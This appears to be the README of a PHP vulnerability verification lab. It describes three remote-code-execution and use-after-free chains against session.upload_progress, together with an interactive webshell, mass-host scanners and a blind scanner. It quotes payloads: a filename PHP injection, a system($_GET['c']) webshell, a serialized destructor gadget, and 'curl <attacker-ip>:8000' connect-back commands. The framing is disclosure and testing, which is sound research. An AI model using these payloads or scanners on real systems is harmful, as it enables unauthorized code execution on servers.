# php2shell-verify

Independent verification lab and proof-of-concept scripts for the PHP
`session.upload_progress` vulnerabilities published as **CVE-2026-109618 /
CVE-2026-109619** (CVSS v4.0 9.2, PHP 5.4.0–8.5.11, fixed 2026-10-21 in
8.2.35 / 8.3.36 / 8.4.27+ / 8.5.12).

Everything in this repository was written from scratch as an audit of the
public `php2shell-poc` research. None of the audited repo's files are used
here. All three disclosed attack chains were re-implemented and reproduced on
a clean-room setup: PHP **8.2.34** (pinned, pre-patch) in Docker.

> **Authorized testing only.** The PoCs attack whatever `--target` you give
> them. Do not point them at systems you do not own or have explicit
> permission to test.

## Requirements

- Docker
- [uv](https://docs.astral.sh/uv/) (the Python PoCs are stdlib-only;
  `uv run` reads their inline script metadata — no venv, no installs)
- Internet access on first run (Docker Hub pulls, one `apt-get install
  nginx` inside the lab container, and a PHP source download for the ASAN build)

## Quick start

```bash
./lab.sh                                    # start the lab (~1 min)
uv run poc_chain_a.py --docker p2s2-lab     # Chain A: injection + LFI -> RCE
uv run poc_chain_c.py --docker p2s2-lab     # Chain C: handler mismatch -> RCE
uv run rce_shell.py --chain a               # interactive pseudo-shell (REPL)
uv run rce_shell.py --chain c --docker p2s2-lab
uv run scan_hosts.py --target http://127.0.0.1:18081 --docker p2s2-lab
./poc_chain_b.sh                            # Chain B: var_destroy UAF (ASAN)
./lab.sh stop                               # when done
```

Expected verdicts: `[+] RCE CONFIRMED` for A and C, and
`[+] CONFIRMED: heap-use-after-free` for B. Every step prints what it does
and what it observes, so you can follow the chain as it unfolds.

## The vulnerability surface

`session.upload_progress` (PHP default: **on** since 5.4) tracks file-upload
progress in the session. It runs in the SAPI layer's rfc1867 multipart
handler **before any application code**, on any endpoint that accepts a
multipart POST containing the `PHP_SESSION_UPLOAD_PROGRESS` field. That gives
an unauthenticated attacker three primitives:

1. **Session ID fixation** — the handler reads `PHPSESSID` from the POST
   *body* without checking `session.use_only_cookies`, so the attacker picks
   the session-file path (`sess_<sid>`). Fixed by php-src PR #22113.
2. **Content injection** — the upload filename is stored **raw** (no
   sanitization, no encoding) inside the session file.
3. **Serializer confusion** — the handler reads the session with whatever
   `session.serialize_handler` the current directory configures, so a file
   written in `php_serialize` format can be parsed by the `php` handler,
   which splits records at the first `|` and deserializes what follows.

## The lab

One container: `php:8.2.34-fpm` (pinned to the last vulnerable release) with
nginx installed inside. The lab's `php.ini` deliberately enables the bug and
the per-directory mismatch:

| Setting | Value | Why |
|---|---|---|
| `session.upload_progress.enabled` | `1` | The vulnerable surface (PHP default anyway) |
| `session.upload_progress.cleanup` | `0` | Keeps progress data in the session file for inspection |
| `session.use_cookies` / `use_only_cookies` | `0` / `1` | Strictest fixation test: no cookies at all, so a body-SID session can only come from the bug |
| `session.save_path` | `/tmp/sess` | Predictable path for the LFI include |
| `/srv/chainW/.user.ini` | `php_serialize` | Write side of the mismatch |
| `/srv/chainR/.user.ini` | `php` | Read side of the mismatch |
| `opcache.preload` | `srv/preload.php` | Defines the `Evil` class at FPM startup — required because the injected object executes before any app code could define it |

Webroot endpoints (deliberately minimal, no framework):

- `/chainA/index.php` — any session-backed POST endpoint (Chain A target)
- `/chainA/lfi.php` — `include($_GET['page'])`: the documented "application
  has an LFI" precondition (this file **is** the vulnerability being chained;
  it is the only intentionally dangerous endpoint)
- `/chainW/up.php`, `/chainR/up.php` — the two handler sides (Chain C);
  `/chainR/up.php` also echoes the destructor's output as a `==PROOF==` block
  and unlinks the proof file, so command output is readable over plain HTTP

## The three chains

### Chain A — session injection + LFI -> RCE (`poc_chain_a.py`)

```
[1] multipart POST, PHPSESSID in the body (no cookie)
      -> session file sess_<attacker-sid> created; upload filename
         "<?php system('id');echo 'RCE-A-OK';?>" stored raw
[2] (optional) raw session file shown via docker exec
[3] GET lfi.php?page=/tmp/sess/sess_<sid>
      -> include() executes the stored PHP -> command output in the response
```

Requires only the PHP default config plus an application LFI. Verified
output: `uid=33(www-data)`.

Payload note: **use single quotes inside the PHP payload**. Multipart
filenames are quote-delimited and truncate at the first embedded `"`
(e.g. `filename="a"b"` yields just `a`). This is also why the original
repo's escaped-quote filename payloads are unreliable — see findings below.

### Chain B — var_destroy `__destruct` reentry UAF (`poc_chain_b.sh` + `chainb/poc_uaf.php`)

Local memory-corruption primitive in `unserialize()` (application must feed
attacker data to `unserialize()`):

```
1. array with > VAR_ENTRIES_MAX (1024) entries -> var_hash "extension chunks"
2. duplicate array key -> the replaced value (our object) is parked on the
   deferred-destruction chain inside var_hash
3. var_destroy(): phase 1 efree()s the extension chunks; phase 2 walks the
   dtor chain and fires __destruct WITHOUT holding BG(serialize_lock)
4. our __destruct calls unserialize('R:1500;') -> the inner parser shares the
   outer (freed) var_hash -> back-reference reads freed memory
```

A fresh `unserialize()` has an empty var_hash, so `R:1500` must return
`false`. Any other value proves the read. The script runs three stages:

1. stock ZendMM (freed chunks intact -> readable stale value),
2. `USE_ZEND_ALLOC=0` (malloc-backed),
3. PHP 8.2.34 built from source with AddressSanitizer (~10 min first run,
   cached after): `heap-use-after-free, READ at php_var_unserialize
   (var_unserializer.c:850), freed by var_destroy (:245)`.

**Scope note:** stage 3 verifies the memory-corruption primitive — the same
evidence class the public research ships. The full RCE (heap grooming +
function-handler overwrite via `/proc/self/mem`) is a separate, weaponized
step and is not included here.

### Chain C — handler mismatch -> object injection -> `__destruct` RCE (`poc_chain_c.py`)

```
[1] WRITE via /chainW (php_serialize): session key
      upload_progress_AAA|O:4:"Evil":1:{s:3:"cmd";s:N:"<cmd>";}
    is stored raw inside the php_serialize-format file
[2] READ  via /chainR (php handler, same SID): the php decoder splits the
    file at the first `|`, deserializes the Evil object, then hits trailing
    data -> decode FAILURE
[3] Evil::__destruct fires during decode cleanup — before any application
    code, on the FAILURE path -> command output in /tmp/rce_proof
```

The payload rides in the `PHP_SESSION_UPLOAD_PROGRESS` **field value**, which
is raw multipart body data with no quoting restrictions (the same vector as
the original 2015 bug report #71101). The lab's read endpoint echoes the
destructor's output as a `==PROOF==` block, so plain HTTP alone confirms the
RCE; `--docker p2s2-lab` additionally checks `/tmp/rce_proof` directly.

## Interactive pseudo-shell (`rce_shell.py`)

Both HTTP chains work as a REPL: type a command, it is executed through the
chain, the output is printed, and you get the next prompt. `exit` or Ctrl-D
quits.

```bash
uv run rce_shell.py --chain a                    # Chain A driver
uv run rce_shell.py --chain c --docker p2s2-lab  # Chain C driver
```

- **Chain A** injects a tiny webshell into the session file *once*
  (`system($_GET['c'])`, single-quote-only, output markers assembled at
  runtime) and then runs every command as a plain
  `GET lfi.php?page=<sessfile>&c=<cmd>` — output comes straight from the LFI
  response, no docker required.
- **Chain C** re-delivers each command as a fresh serialized `Evil` object
  (write via the `php_serialize` dir, trigger via the `php` dir). Output is
  the `==PROOF==` block echoed by the read endpoint, with `--docker` as a
  fallback that reads `/tmp/rce_proof` directly.
- **Chain B** has no interactive mode — it is a one-shot memory-corruption
  primitive, not a persistent channel.

## Host scanner (`scan_hosts.py`)

Tests a list of targets (`http://ip:port`, `https://domain`, bare
`host[:port]` -> http) for chains A and C. Chain B is excluded — memory
corruption cannot be proven remotely.

```bash
uv run scan_hosts.py --hosts hosts.txt
uv run scan_hosts.py --target http://127.0.0.1:18081 --docker p2s2-lab
uv run scan_hosts.py --hosts prod.txt --a-lfi-path /vuln.php \
    --a-lfi-param page --save-path /var/lib/php/sessions --workers 16
```

Every request carries a **runtime-computed marker** — chain A injects
`<?php echo 'XUP',(21*2),'-','<nonce>';?>` (prints `XUP42-<nonce>`), chain C
ships `echo XCH42-<nonce>` inside the serialized gadget. The literal marker
never appears in any echoed source, so a match can only come from executed
code — no false positives from reflected input.

Verdicts per host:

| Verdict | Meaning |
|---|---|
| `VULNERABLE` | an RCE marker came from executed code (chains A and/or C) |
| `FIXATED+INJECTED` | `--docker` confirmed the session file holds the payload, but no RCE proof (no `--a-lfi-path` given) |
| `PATCHED?` | the write response returned a *fresh* `Set-Cookie` — the body SID was rejected (patched behavior with default `use_cookies=1`) |
| `MISMATCH CONFIRMED` | handler-mismatch decode warning seen, but no known destruct gadget fired |
| `INDICATOR ONLY` | no `Set-Cookie` (possible fixation; unverified without `--docker`) |
| `NO SIGNALS` / `UNREACHABLE` | nothing observed / TCP or TLS failed |

Chain A also runs a **fixation oracle**: on a patched PHP with default ini
the body SID is ignored and a new session is issued via `Set-Cookie`, while
a vulnerable build honors the body SID and sends no cookie. Hosts running
`use_cookies=0` never send cookies in either case — use `--docker` (session
file check) to discriminate. The `PATCHED?` verdict is a strong but
config-dependent signal; treat it as heuristic.

Notes:
- chain A's `--a-write-path` can be *any* endpoint that accepts a multipart
  POST (the SAPI handler runs before application code); `--a-lfi-path`
  points at the application's LFI — without it chain A still reports the
  fixation result but cannot prove RCE.
- chain C's gadget defaults to the lab's `Evil` class (`--gadget`,
  `--gadget-prop` to adapt to other preloaded destruct gadgets); its proof
  is the `==PROOF==` echo from the read endpoint, or the proof file with
  `--docker`.
- TLS is accepted unverified by default (scanner use-case);
  `--verify-tls` enforces validation.
- Exit code is `1` when at least one host is VULNERABLE (CI-friendly);
  `--json FILE` dumps full results.
- **Vulnerable targets are appended to `vulnerable.txt`** (default; rename
  with `--log FILE`, disable with `--log ''`) as they are confirmed — one
  target per line with the chains that fired (`# chains A+C`), deduped
  against previous runs under a per-run timestamp header. The file stays
  `--hosts`-compatible, so it doubles as a re-scan list.

## Blind scanner (`scan_blind.py`)

Proves RCE even when the target returns **no output**: the payload makes the
target run `curl <attacker-ip>:8000` against a listener the script opens
(`0.0.0.0:8000`), and any inbound connection is positive proof. Every
attempt carries a unique beacon path (`curl <ip>:8000/<tag>`), so a beacon
identifies *exactly which technique* fired; one literal bare
`curl <ip>:8000` attempt per chain is peer-IP-attributed. The listener
replies `BEACON-OK`, so when the execution channel *does* return output the
beacon is double-confirmed in the response body.

```bash
uv run scan_blind.py --hosts hosts.txt
uv run scan_blind.py http://127.0.0.1:18081 --docker p2s2-lab
uv run scan_blind.py 10.0.0.5:80 --ip 10.0.0.1 --listen-port 8000
```

Techniques tried per target (the full matrix):

| # | Chain | Technique | Evidence |
|---|---|---|---|
| A1 | A | webshell via filename injection (`system($_GET['c'])`) + LFI include; write and LFI endpoints auto-probed unless given | marker, then blind beacons |
| A2 | A | one-shot payloads: 6 exec wrappers (`system`, `passthru`, `shell_exec`, `exec`, `popen`, backticks) x 2 vectors (filename, progress value), each with its own beacon — runs when `--a-lfi-path` is known but the webshell marker is absent | blind beacons |
| C1 | C | serialized destruct gadget, marker via `==PROOF==` echo / `--docker` | marker |
| C2/C3 | C | gadget cmd = `curl <ip>:8000` (bare + tagged) | blind beacons |

Verification ladder: verifiable marker -> blind beacon -> preconditions
(fixation / handler mismatch) -> `PATCHED?` (fresh Set-Cookie oracle).

Networking notes:
- the beacon must reach the listener: on the same LAN use your host IP
  (`--ip` to pin it); otherwise the source IP is auto-detected per target
  from the routing table.
- scanning the bundled lab (or any docker target on this host): the target
  container's loopback is *its own* — the scanner auto-detects the
  `docker0` bridge IP (`172.17.0.1`) and beacons arrive from the container
  IP (`172.17.0.x`), which it also uses for bare-beacon attribution.
- bare-beacon attribution for non-docker loopback targets can catch
  unrelated local connections hitting the listener port — prefer unique
  tag evidence there (the scanner warns in the results).
- the target needs `curl` or `wget` for beacons.
- the beacon files (`vulnerable.txt` log, `--json`) work exactly as in
  `scan_hosts.py`.

For authorized testing only — scanning makes the target execute connect-back
commands.

## Findings from this verification (beyond the original research)

1. **Filename truncation.** PHP's multipart parser stops a `filename="..."`
   value at the first embedded `"` and does not unescape `\"`. Raw-quote and
   backslash-escaped object payloads in filenames get truncated
   (`x|O:4:"Evil":0:{}` lands as `x|O:4:"`). The reliable injection vector is
   the progress-field value (Chain C as implemented here), or quote-free
   payloads for the filename (Chain A's single-quoted PHP).
2. **Fixation is stronger than advertised.** With `use_cookies=0` **and**
   `use_only_cookies=1` (no cookie sent at all), the body SID is still
   accepted and the session file is created — the rfc1867 handler ignores
   the cookie policy entirely pre-patch.
3. **Chain C fires on decode failure.** The `__destruct` executes during
   `PHP_VAR_UNSERIALIZE_DESTROY` cleanup even though `session_start()`
   subsequently discards the session — the "Failed to decode session object"
   warning and the RCE appear in the same request.

## File map

```
lab.sh                    start/stop the lab container (php:8.2.34-fpm + nginx)
php.ini                   lab PHP config (the deliberate vulnerabilities)
nginx-site.conf           nginx -> FPM proxy config (installed inside the container)
srv/                      webroot mounted at /srv in the container
  preload.php             Evil class for Chain C (opcache.preload)
  chainA/index.php        session-backed POST endpoint (Chain A)
  chainA/lfi.php          include($_GET['page']) — the chain's app precondition
  chainW/up.php + .user.ini   php_serialize side (Chain C write)
  chainR/up.php + .user.ini   php side (Chain C read)
poc_chain_a.py            Chain A PoC  (uv run, stdlib only, http/https)
poc_chain_c.py            Chain C PoC  (uv run, stdlib only, http/https)
rce_shell.py              Interactive pseudo-shell over chain A or C (REPL)
scan_hosts.py             Multi-host scanner for chains A and C (threaded)
scan_blind.py             Blind-capable scanner: beacon listener on :8000,
                          all techniques (6 exec wrappers x 2 vectors)
hosts.example.txt         Example target list for the scanners
poc_chain_b.sh            Chain B driver (behavioral + ASAN stages)
chainb/poc_uaf.php        Chain B trigger (standalone PHP)
chainb/Dockerfile.asan    PHP 8.2.34 built from source with AddressSanitizer
```

## PoC options

| Flag | Chains | Meaning |
|---|---|---|
| `--target URL` | A, C | `http://` or `https://` target (default `http://127.0.0.1:18081`) |
| `--cmd '<command>'` | A, C | Command executed by the injected payload |
| `--sid <id>` | A, C | Fix a specific session ID (default: random per run) |
| `--docker <container>` | A, C | Add raw session-file / proof-file checks via `docker exec` |
| `--hosts FILE`, `--workers N`, `--timeout S` | scan | Target list, thread pool size, per-request timeout |
| `--gadget CLASS`, `--gadget-prop NAME` | scan | Preloaded destruct gadget class for chain C |
| `--json FILE`, `--log FILE`, `--quiet`, `--verify-tls` | scan | Output files, vulnerable-target log, TLS behavior |
| `--chain {a,c}` | rce_shell | Which chain drives the interactive shell |
| `--lfi-path`, `--lfi-param`, `--save-path` | A, shell a | Adjust to the target's LFI endpoint and session directory |
| `--write-path`, `--read-path`, `--output-path` | C, shell c | Adjust to the target's two handler endpoints and proof path |

Random SIDs make A and C safely re-runnable; Chain C clears its own proof
file first so stale results cannot fake success.

## Safety

- The lab container runs a real pre-auth LFI on `127.0.0.1:18081`. Keep it
  local and `./lab.sh stop` when finished.
- The lab container runs with default (non-privileged) Docker settings; only
  Chain B needs nothing special at all (pure `unserialize()`).
- Do not run the PoCs against systems you do not own or have explicit
  authorization to test.
